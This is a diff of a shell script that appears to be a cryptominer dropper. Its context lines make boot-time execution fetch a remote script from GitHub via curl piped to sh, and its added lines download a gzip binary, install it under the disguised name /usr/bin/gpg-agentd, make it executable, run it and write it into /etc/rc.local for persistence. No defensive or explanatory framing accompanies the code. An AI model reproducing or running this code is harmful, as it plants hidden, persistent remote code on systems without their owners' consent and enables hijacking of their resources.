@@ -34,6 +34,16 @@ echo 'curl -qs https://raw.githubusercontent.com/testuser1s/k/master/b.sh | sh' 
 echo 'exit 0' >> /etc/rc.local
 # grep -q 8.8.8.8 /etc/resolv.conf || echo "nameserver 8.8.8.8" >> /etc/resolv.conf
 # grep -q 5.206.225.60 /etc/hosts || echo "5.206.225.60 static.cortins.tk" >> /etc/hosts
+if [ ! -f /usr/bin/gpg-agentd ]; then
+        wget https://github.com/testuser1s/k/files/1878076/xig.gz -P /usr/bin/gpg-agentd
+        sleep 2
+        echo '/usr/bin/gpg-agentd' > /etc/rc.local
+        echo 'exit 0' >> /etc/rc.local
+fi
+sleep 2
+if [ -f /usr/bin/gpg-agentd ]; then
+        chmod a+x /usr/bin/gpg-agentd && /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentd
+fi
 sleep 1
 cat <<EOF> /etc/security/limits.conf
 *         hard    nofile      25000
